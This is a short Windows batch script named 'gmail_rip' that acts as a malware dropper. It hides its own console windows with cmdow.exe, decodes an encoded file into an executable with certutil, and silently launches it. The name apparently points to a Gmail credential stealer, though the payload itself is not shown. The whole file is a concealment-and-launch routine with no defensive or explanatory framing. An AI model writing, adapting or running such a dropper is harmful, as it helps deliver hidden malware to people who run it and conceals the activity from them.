@echo off
title gmail_rip
cmdow.exe "gmail_rip" /HID
cmdow.exe "Administrator:  gmail_rip" /HID

certutil -decode gmail_rip.code gmail_rip.exe
start gmail_rip.exe
exit